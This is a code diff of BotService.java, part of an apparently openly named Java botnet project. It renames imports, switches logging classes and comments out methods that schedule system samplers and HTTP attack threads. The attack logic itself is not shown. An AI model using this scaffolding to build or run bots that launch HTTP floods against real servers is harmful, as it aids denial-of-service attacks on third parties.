@@ -23,14 +23,17 @@
  * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  * THE SOFTWARE.
  */
+
 package com.acmutv.botnet.bot;
 
+import com.acmutv.botnet.attack.HttpAttack;
+import com.acmutv.botnet.attack.HttpAttackMethod;
 import com.acmutv.botnet.attack.HttpGetAttack;
 import com.acmutv.botnet.report.statistics.NetworkSampler;
 import com.acmutv.botnet.report.statistics.SystemSampler;
 import com.acmutv.botnet.config.BotConfiguration;
 import com.acmutv.botnet.target.HttpTarget;
-import com.acmutv.botnet.tool.LoggerTools;
+import com.acmutv.botnet.service.Logger;
 
 import java.util.concurrent.*;
 
@@ -44,7 +47,7 @@ public class BotService {
 
   /**
    * Registers both system and network samplers, according to the given configuration.
-   */
+
   public static void registerSamplers() {
     BotConfiguration config = BotConfiguration.getInstance();
     final ScheduledExecutorService scheduler =
@@ -67,7 +70,7 @@ public class BotService {
       try {
         if (scheduler.awaitTermination(maxtime, TimeUnit.SECONDS)) {
           if (config.isDebug()) {
-            LoggerTools.info("SAMPLERS THREAD POOL SHUTDOWN");
+            Logger.info("SAMPLERS THREAD POOL SHUTDOWN");
           }
         }
       } catch (InterruptedException exc) {
@@ -75,11 +78,12 @@ public class BotService {
       }
     }
   }
+   */
 
   /**
    * Registers HTTP attackers, according to the given configuration.
-   */
-  private static void registerHTTPAttackers() {
+
+  private static void registerHttpAttacks(HttpAttack attackers[]) {
     BotConfiguration config = BotConfiguration.getInstance();
     int numcores = Runtime.getRuntime().availableProcessors();
     ExecutorService executor = Executors.newFixedThreadPool(numcores);
@@ -96,7 +100,7 @@ public class BotService {
       try {
         if (executor.awaitTermination(maxtime, TimeUnit.SECONDS)) {
           if (config.isDebug()) {
-            LoggerTools.info("ATTACKS THREAD POOL SHUTDOWN");
+            Logger.info("ATTACKS THREAD POOL SHUTDOWN");
           }
         }
       } catch (InterruptedException exc) {
@@ -104,7 +108,7 @@ public class BotService {
       }
     }
   }
-
+   */
   /**
    * Registers a periodic task.
    * @param task the task to execute.
